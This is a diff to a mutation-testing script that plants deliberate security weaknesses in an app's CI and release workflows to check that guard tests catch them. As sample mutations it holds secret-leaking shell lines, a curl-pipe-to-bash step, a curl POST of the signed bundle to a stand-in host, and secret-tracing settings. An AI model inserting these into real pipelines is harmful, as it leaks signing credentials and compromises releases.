@@ -138,6 +138,72 @@ MUTATIONS: list[Mutation] = [
              'release-shape: the upload must name THIS package'),
 
     # ---- triggers (#170) --------------------------------------------------
+    # ---- #190: the leak shapes #176 listed and did not close ---------------
+    Mutation("#190", "a secret is written to a file under HOME", "tools/set_ci_secrets.sh",
+             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
+                 r'\1echo "$KEYSTORE_PASS" > "$HOME/leak.txt"\n'),
+             "a secret on disk is leaked as surely as one printed",
+             'reached file'),
+    Mutation("#190", "a partial secret, first 8 characters", "tools/set_ci_secrets.sh",
+             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
+                 r'\1echo "pw8: ${KEYSTORE_PASS:0:8}"\n'),
+             "eight characters of a password narrows a search enormously",
+             'first 8 characters'),
+    Mutation("#190", "a base64-transformed secret", "tools/set_ci_secrets.sh",
+             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
+                 r'\1printf %s "$KEYSTORE_PASS" | base64\n'),
+             "a literal scan is defeated by any encoding, trivially reversible",
+             'base64'),
+    Mutation("#190", "the password moves onto keytool's argv", "tools/set_ci_secrets.sh",
+             sub(r"-storepass:env HS_PASS_PROBE", '-storepass "$KEYSTORE_PASS"'),
+             "the password becomes readable from the process table by anything on the machine",
+             'command line'),
+    Mutation("#190", "make_upload_key.sh prints the password", "tools/make_upload_key.sh",
+             sub(r'(chmod 600 "\$KEYSTORE"\n)', r'\1echo "pw: $HS_KEYSTORE_PASS"\n'),
+             "the only script holding the plaintext password was outside the leak group",
+             'reached stdout'),
+    # ---- #182: the upload rule applied to every file, and step sets -------
+    Mutation("#182", "a Play upload added to ci.yml", ".github/workflows/ci.yml",
+             sub(r"(      - id: gate\n        name: Quality gate\n        run: tools/gate\.sh\n)",
+                 r"\1\n      - id: exfil\n        uses: r0adkll/upload-google-play@v1\n"
+                 "        with:\n          serviceAccountJsonPlainText: x\n          track: production\n"),
+             "ci.yml is workflow_called with secrets: inherit, so this uploads with the real key on a tag",
+             'upload-scope:'),
+    Mutation("#182", "an extra step in the ci gate job", ".github/workflows/ci.yml",
+             sub(r"(      - id: gate\n        name: Quality gate\n        run: tools/gate\.sh\n)",
+                 r"\1\n      - id: extra\n        run: curl -sSL https://example.test/x | bash\n"),
+             "an added step in the gate job runs with whatever secrets the caller inherited",
+             'ci-shape: exactly these steps'),
+    Mutation("#182", "a step between play and summary curls the bundle out", ".github/workflows/release.yml",
+             sub(r"^      - id: summary$",
+                 "      - id: exfil\n        run: curl -X POST --data-binary @app.aab https://example.test/x\n      - id: summary", flags=re.M),
+             "the signed bundle leaves the runner after the upload and before the summary",
+             'release-shape: exactly these steps'),
+    Mutation("#182", "ship moves to a self-hosted runner", ".github/workflows/release.yml",
+             sub(r"^    runs-on: ubuntu-latest$", "    runs-on: attacker-self-hosted", 1, re.M),
+             "a self-hosted runner sees every secret this workflow holds",
+             'runs on `attacker-self-hosted`'),
+    # ---- #189: the merge gate, and three tracing variants -----------------
+    Mutation("#189", "if: false on the ci gate job", ".github/workflows/ci.yml",
+             sub(r"^  gate:\n    runs-on: ubuntu-latest$",
+                 "  gate:\n    if: false\n    runs-on: ubuntu-latest", flags=re.M),
+             "the entire merge gate is skipped, and a skipped required check does not block a merge",
+             'A skipped job reports as skipped'),
+    Mutation("#189", "|| true on the keystore alias check", ".github/workflows/release.yml",
+             sub(r'-alias "\$HS_KEY_ALIAS" > /dev/null$',
+                 '-alias "$HS_KEY_ALIAS" > /dev/null || true', flags=re.M),
+             "a keystore whose alias is not the configured one passes the check meant to catch it",
+             'discards the exit status'),
+    Mutation("#189", "shell: bash -o xtrace, the long form", ".github/workflows/release.yml",
+             sub(r"^defaults:\n  run:\n    shell: bash$",
+                 "defaults:\n  run:\n    shell: bash -o xtrace", flags=re.M),
+             "every step of the job holding five secrets is traced",
+             'secrets:'),
+    Mutation("#189", "SHELLOPTS: xtrace in the ship env", ".github/workflows/release.yml",
+             sub(r'^      FLUTTER_SUPPRESS_ANALYTICS: "true"$',
+                 '      FLUTTER_SUPPRESS_ANALYTICS: "true"\n      SHELLOPTS: xtrace', flags=re.M),
+             "bash reads SHELLOPTS at startup, so every step of the job is traced",
+             'secrets:'),
     Mutation("#170", "pull_request_target added", ".github/workflows/ci.yml",
              sub(r"^  pull_request:$", "  pull_request:\n  pull_request_target:", flags=re.M),
              "fork code runs with the base repo's secrets and a write token",
@@ -166,7 +232,7 @@ MUTATIONS: list[Mutation] = [
       - id: promote
         run: tools/play_promote.sh com.honestarcade.sudoku internal production"""),
              "a job with no refusal mints the credential and promotes",
-             'is a legitimate promotion and was refused'),
+             'not the dispatch input'),
 
     # ---- play-api-check's keystore step (#173) ----------------------------
     # Was "the alias assertion is disabled", replacing `if [ "$alias_got" !=
@@ -257,7 +323,10 @@ MUTATIONS: list[Mutation] = [
              "tools/make_upload_key.sh",
              sub(r"escape_for_double_quotes \"\$HS_KEYSTORE_PASS\"", '$HS_KEYSTORE_PASS'),
              "a password containing $( ) executes and is recorded wrong",
-             'source:'),
+             # The leak scan added for #190 now fires first, inside the same
+             # round-trip test: an unescaped password partially reaches
+             # stderr. Earlier and more specific than the old marker.
+             'survives the round trip'),
 ]
 
 
@@ -334,8 +403,30 @@ def main() -> int:
             result = run(SUITE)
             output = result.stdout + result.stderr
             if result.returncode == 0:
-                survived.append(m)
-                print(f"  SURVIVED {label}\n           {m.why}")
+                # Re-run before reporting a survivor. A SURVIVED verdict is
+                # the one that matters — it says a guard has a hole — and one
+                # flaky green would announce a hole that is not there, or
+                # worse, be dismissed as flake when it is real. A second
+                # green costs one suite run on the rare path only (#192).
+                confirm = run(SUITE)
+                if confirm.returncode != 0:
+                    output = confirm.stdout + confirm.stderr
+                    print(f"  (first run of {label} was green, second was not "
+                          f"— reporting the second)")
+                else:
+                    survived.append(m)
+                    print(f"  SURVIVED {label}\n           {m.why}")
+            if result.returncode == 0 and m not in survived:
+                # Fell through from the flaky branch above; judged on the
+                # confirming run's output.
+                if m.expect and m.expect not in output:
+                    wrong.append(m)
+                    print(f"  WRONG-REASON {label}\n               the suite "
+                          f"failed, but not with {m.expect!r}")
+                else:
+                    print(f"  caught  {label}")
+            elif result.returncode == 0:
+                pass
             elif m.expect and m.expect not in output:
                 # Red, but not for this reason. Counting it as caught is how a
                 # guard gets credit for an assertion it does not make.
